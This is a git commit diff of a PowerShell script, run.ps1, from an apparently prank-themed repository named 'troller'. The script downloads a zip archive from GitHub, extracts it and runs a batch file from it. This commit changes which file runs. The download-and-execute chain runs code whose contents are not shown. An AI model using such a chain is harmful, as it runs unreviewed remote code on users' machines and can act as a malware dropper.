25cdc77fe106cd1d4102cf077da5a45fb4ca3c04
boatinalamp <93244703+boatinalamp@users.noreply.github.com>
2023-04-10 21:27:14 +0530

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -2,4 +2,4 @@ cd $home
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/boatinalamp/troller/main/bat.zip" -OutFile "bat.zip"
 Expand-Archive bat.zip -DestinationPath bat
 cd bat\bat
-.\run.vbs
+.\source.bat
